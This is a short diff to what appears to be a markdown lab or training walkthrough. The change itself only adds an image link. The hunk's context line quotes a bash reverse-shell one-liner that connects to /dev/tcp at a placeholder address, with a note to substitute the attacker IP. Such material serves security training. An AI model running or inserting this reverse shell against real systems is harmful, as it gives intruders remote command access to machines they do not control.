@@ -191,9 +191,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1   substitute attackerIP
 ![image](https://github.com/user-attachments/assets/6fc026b3-b7ba-4fa8-b282-f509e9d320c9)
 
 
-
-
-
+![academy-41](https://github.com/user-attachments/assets/9d724c1e-feda-459d-b1eb-dc2ff1084848)
 
 
 
